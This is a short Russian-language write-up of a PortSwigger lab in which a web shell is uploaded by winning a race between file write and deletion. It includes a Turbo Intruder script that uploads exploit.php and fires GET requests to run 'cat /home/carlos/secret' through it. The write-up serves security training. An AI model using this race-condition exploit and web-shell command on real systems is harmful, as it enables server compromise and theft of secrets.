# Веб-шелл через race condition: окно между записью и удалением

**Лаба:** [Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition) (Expert, File upload)
**Суть:** валидация загрузки идёт ПОСЛЕ записи файла на диск. Файл лежит в доступной директории, пока его не удалили, — окно в доли секунды, в которое его можно исполнить.

## Диагностика

Все классические обходы (Content-Type, null byte, polyglot, .htaccess) отлетают. Но ответ на загрузку приходит секунду — это подозрительно. Мгновенный отказ = проверка до записи; задержка = файл записали, потом валидируют, потом удаляют. Между записью и удалением файл существует и исполняется. Классический TOCTOU.

## Эксплуатация

Пайплайн сервера:

```
1. принять файл
2. записать в /files/avatars/
3. проверить тип
4. удалить, если не картинка
```

Шаги 2 и 4 не атомарны. Скрипт для Turbo Intruder (шаблон `race-single-packet-attack`):

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)
    engine.queue(target.req, gate='race1')          # POST /my-account/avatar с exploit.php
    for x in range(5):
        engine.queue(get_req, gate='race1')          # GET /files/avatars/exploit.php?cmd=cat /home/carlos/secret
    engine.openGate('race1')
    engine.complete(timeout=60)
```

Один POST заливает шелл, пять GET'ов сразу за ним пытаются его выполнить. Часть GET'ов получает 200 с содержимым `/home/carlos/secret` — попали в окно.

## Заметка

Задержка ответа как сигнал TOCTUY — приём, который теперь проверяю везде, где есть upload. И отдельно: single-packet attack выравнивает отправку так, что оба запроса прилетают почти одновременно — без этого гонку проиграешь на сетевом джиттере.
